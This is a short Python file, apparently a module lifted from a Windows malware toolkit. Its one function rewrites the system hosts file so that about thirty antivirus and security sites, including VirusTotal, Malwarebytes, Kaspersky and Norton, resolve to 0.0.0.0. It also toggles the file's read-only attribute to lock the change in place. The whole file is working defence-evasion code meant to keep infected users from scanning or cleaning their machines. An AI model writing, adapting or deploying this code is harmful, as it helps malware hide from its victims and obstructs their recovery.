# credits to blank

import os
import subprocess

def block_sites():
    call = subprocess.run(
        "REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /V DataBasePath", shell=True,
        capture_output=True)

    if call.returncode != 0:
        hostdirpath = os.path.join("System32", "drivers", "etc")
    else:
        hostdirpath = os.sep.join(
            call.stdout.decode(errors="ignore").strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
    hostfilepath = os.path.join(os.getenv("systemroot"), hostdirpath, "hosts")
    if not os.path.isfile(hostfilepath):
        return
    with open(hostfilepath) as file:
        data = file.readlines()

    BANNED_SITES = (
    "virustotal.com", "avast.com", "totalav.com", "scanguard.com", "totaladblock.com", "pcprotect.com", "mcafee.com",
    "bitdefender.com", "us.norton.com", "avg.com", "malwarebytes.com", "pandasecurity.com", "avira.com", "norton.com",
    "eset.com", "zillya.com", "kaspersky.com", "usa.kaspersky.com", "sophos.com", "home.sophos.com", "adaware.com",
    "bullguard.com", "clamav.net", "drweb.com", "emsisoft.com", "f-secure.com", "zonealarm.com", "trendmicro.com",
    "ccleaner.com")
    newdata = []
    for i in data:
        if any([(x in i) for x in BANNED_SITES]):
            continue
        else:
            newdata.append(i)

    for i in BANNED_SITES:
        newdata.append("\t0.0.0.0 {}".format(i))
        newdata.append("\t0.0.0.0 www.{}".format(i))

    newdata = "\n".join(newdata).replace("\n\n", "\n")

    subprocess.run("attrib -r {}".format(hostfilepath), shell=True,
                   capture_output=True)  # Removes read-only attribute from hosts file
    with open(hostfilepath, "w") as file:
        file.write(newdata)
    subprocess.run("attrib +r {}".format(hostfilepath), shell=True,
                   capture_output=True)  # Adds read-only attribute to hosts file
